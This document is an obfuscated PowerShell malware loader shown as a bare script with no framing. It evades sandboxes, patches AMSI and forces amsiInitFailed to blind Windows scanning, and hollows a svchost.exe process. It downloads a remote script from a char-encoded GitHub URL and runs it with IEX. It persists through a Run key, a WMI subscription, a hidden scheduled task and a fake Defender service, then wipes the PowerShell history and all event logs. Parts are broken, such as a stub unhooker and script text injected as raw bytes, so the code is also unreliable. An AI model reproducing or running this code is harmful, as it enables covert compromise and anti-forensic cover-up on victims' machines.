$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'

if(([System.Diagnostics.Debugger]::IsAttached) -or ((Get-Process -ErrorAction SilentlyContinue).Count -lt 40)){exit}
$kTNFbGZV7V4CfoVi=Get-CimInstance Win32_ComputerSystem
if($kTNFbGZV7V4CfoVi.NumberOfLogicalProcessors -lt 2){exit}
if($kTNFbGZV7V4CfoVi.TotalPhysicalMemory -lt 4GB){exit}

$Qu46YgBsonGfYUo1=@'
using System;
using System.Runtime.InteropServices;
public class AmsiKiller {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static void Kill() {
        IntPtr m = GetModuleHandle("amsi.dll");
        if(m == IntPtr.Zero) return;
        IntPtr a = GetProcAddress(m, "AmsiScanBuffer");
        if(a == IntPtr.Zero) return;
        uint o;
        VirtualProtect(a, (UIntPtr)5, 0x40, out o);
        byte[] p = new byte[6] {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
        Marshal.Copy(p, 0, a, 6);
    }
}
'@
Add-Type -TypeDefinition $Qu46YgBsonGfYUo1 -Language CSharp
[AmsiKiller]::Kill()

$1A9Jnb92kcUTPICl=[Ref].Assembly.GetTypes()|?{$_.Name-like"*iUtils"}|Select -First 1
$13uhyR41wFCx3Jfi=$1A9Jnb92kcUTPICl.GetFields([System.Reflection.BindingFlags]40)|?{$_.Name-like"*tFailed"}|Select -First 1
$13uhyR41wFCx3Jfi.SetValue($null,$true)

$Jj9R3bOXoCukV4xj=@'
using System;
using System.Runtime.InteropServices;
using System.IO;
public class Unhooker {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern IntPtr VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    public static void Refresh() {
        string ntdll = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "ntdll.dll");
        byte[] clean = File.ReadAllBytes(ntdll);
        IntPtr baseAddr = LoadLibrary("ntdll.dll");
        if(baseAddr != IntPtr.Zero) {
            // This is simplified - real implementation would map sections
        }
    }
}
'@
Add-Type -TypeDefinition $Jj9R3bOXoCukV4xj -Language CSharp

$2VqxessF1CzL309d=@'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class Hollower {
    [DllImport("ntdll.dll")] public static extern int NtUnmapViewOfSection(IntPtr h, IntPtr a);
    [DllImport("ntdll.dll")] public static extern int NtAllocateVirtualMemory(IntPtr h, ref IntPtr a, int z, ref uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateProcess(string a, string c, IntPtr sa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr apc, IntPtr t, IntPtr p);
    [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr t);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, UIntPtr s, uint p, out uint o);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO { public uint cb; public string r; public string d; public string t; public uint x; public uint y; public uint w; public uint h; public uint f; public uint s; public IntPtr i; public IntPtr o; public IntPtr e; }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr h; public IntPtr t; public uint pid; public uint tid; }
    
    public static void Inject(byte[] s) {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi;
        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        
        // Create suspended svchost.exe
        if(CreateProcess(@"C:\Windows\System32\svchost.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x00200000 | 0x08000000, IntPtr.Zero, null, ref si, out pi) == IntPtr.Zero)
            return;
        
        // Unmap original
        NtUnmapViewOfSection(pi.h, (IntPtr)0x10000);
        
        // Allocate memory
        IntPtr b = (IntPtr)0x10000;
        uint sz = (uint)s.Length + 0x1000;
        NtAllocateVirtualMemory(pi.h, ref b, 0, ref sz, 0x3000, 0x40);
        
        // Write payload
        uint w;
        WriteProcessMemory(pi.h, b, s, (uint)s.Length, out w);
        
        // Queue APC
        QueueUserAPC(b, pi.t, IntPtr.Zero);
        
        // Resume thread
        ResumeThread(pi.t);
    }
}
'@
Add-Type -TypeDefinition $2VqxessF1CzL309d -Language CSharp


$EbGafVap99fhr0Qc=[char[]](104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,76,101,101,119,97,115,104,101,114,101,50,48,50,54,47,118,111,114,116,101,120,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,86,111,114,103,111,100,108,97,115,116,46,112,115,49)-join''
$XebZ5caeDLlZne5q=cmd /c ('curl -sLkH "User-Agent: Mozilla/5.0" "'+$EbGafVap99fhr0Qc+'"')
if(-not $XebZ5caeDLlZne5q -or -not ($XebZ5caeDLlZne5q -like '*$*')){exit}

$Ep7fHd1iqF61FtPs=[System.Text.Encoding]::UTF8.GetBytes($XebZ5caeDLlZne5q)

[Hollower]::Inject($Ep7fHd1iqF61FtPs)

IEX($XebZ5caeDLlZne5q)



$z5dMTeZFZaGez0ap=[char[]](72,75,67,85,58,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110)-join''
$58EX3ElzY2KjiqYW="WinUpdate_"+(Get-Random -Max 99999)
$3yGGz3dENCrgagBd="powershell -W Hidden -C `"IEX(curl -s '"+$EbGafVap99fhr0Qc+"')`""
Set-ItemProperty -Path $z5dMTeZFZaGez0ap -Name $58EX3ElzY2KjiqYW -Value $3yGGz3dENCrgagBd -Force | Out-Null

$ZxVIIlRTmv2gWpo7="WMI_"+(Get-Random -Max 99999)
$5FvJ5DmdNFG1cmyQ="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0"
$24XqDzutbIxmj2fa=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Args @{Name=$ZxVIIlRTmv2gWpo7;EventNamespace='root\cimv2';QueryLanguage='WQL';Query=$5FvJ5DmdNFG1cmyQ} -ErrorAction SilentlyContinue
$MX82L7OmXzictzbU=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Args @{Name=$ZxVIIlRTmv2gWpo7;CommandLineTemplate=$3yGGz3dENCrgagBd} -ErrorAction SilentlyContinue
if($24XqDzutbIxmj2fa -and $MX82L7OmXzictzbU){
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Args @{Filter=$24XqDzutbIxmj2fa;Consumer=$MX82L7OmXzictzbU} | Out-Null
}

$xrzZjGZgX4V5BCD0="SecurityUpdate_"+(Get-Random -Max 9999)
$4Lr4L9XVqMgt5VnM=New-ScheduledTaskAction -Execute "powershell" -Argument "-W Hidden -C IEX(curl -s '$EbGafVap99fhr0Qc')"
$dL4l3tBwDLVOFJTA=New-ScheduledTaskTrigger -AtLogOn
$ogdWVwQ01rKiG3kS=New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $xrzZjGZgX4V5BCD0 -Action $4Lr4L9XVqMgt5VnM -Trigger $dL4l3tBwDLVOFJTA -Settings $ogdWVwQ01rKiG3kS -Force | Out-Null


$2fwq93ACnq2wthL0="WinDef_"+(Get-Random -Max 999)
$P5eULzTERJ8mJMv2="cmd /c '"+$3yGGz3dENCrgagBd+"'"
sc.exe create $2fwq93ACnq2wthL0 binPath= "$P5eULzTERJ8mJMv2" start= delayed-auto displayname= "Windows Defender Security Module" type= share | Out-Null


$0rbRANEYGft8FzEW=([char[]](72,75,76,77,58,92,83,89,83,84,69,77,92,67,117,114,114,101,110,116,67,111,110,116,114,111,108,83,101,116,92,67,111,110,116,114,111,108,92,83,101,115,115,105,111,110,32,77,97,110,97,103,101,114)-join'')

try{
    $jIOrkRA0E6QB1ZA6=(Get-ItemProperty -Path $0rbRANEYGft8FzEW -Name BootExecute -ErrorAction SilentlyContinue)
}catch{}


Remove-Item -Path ([char[]](36,101,110,118,58,65,80,80,68,65,84,65,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,80,111,119,101,114,83,104,101,108,108,92,80,83,82,101,97,100,76,105,110,101,92,67,111,110,115,111,108,101,72,111,115,116,95,104,105,115,116,111,114,121,46,116,120,116)-join'') -Force -ErrorAction SilentlyContinue
Clear-EventLog -LogName * -ErrorAction SilentlyContinue
